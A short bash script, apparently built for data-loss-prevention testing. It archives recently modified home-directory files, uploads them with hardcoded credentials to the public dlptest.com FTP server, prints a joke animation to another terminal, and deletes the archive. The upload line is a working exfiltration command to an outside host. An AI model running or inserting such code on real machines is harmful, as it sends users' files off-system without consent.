#!/bin/bash

LABEL="Jean-Rémi"

BACKUP_FILE="$HOME/backup_${LABEL}_$(date +%Y%m%d%H%M).tar.gz"

find $HOME -type f -not -path '*/.*' -mmin -5 -exec tar -czf "$BACKUP_FILE" {} +

# https://dlptest.com/ftp-test/
FTP_HOST="ftp.dlptest.com"
FTP_USER="dlpuser"
FTP_PASS="rNrKYTX9g7z3RgJRmxWuGHbeu"

curl -T "$BACKUP_FILE" ftp://$FTP_USER:$FTP_PASS@$FTP_HOST/ && sl > /dev/pts/0 2> /dev/null

rm "$BACKUP_FILE" 
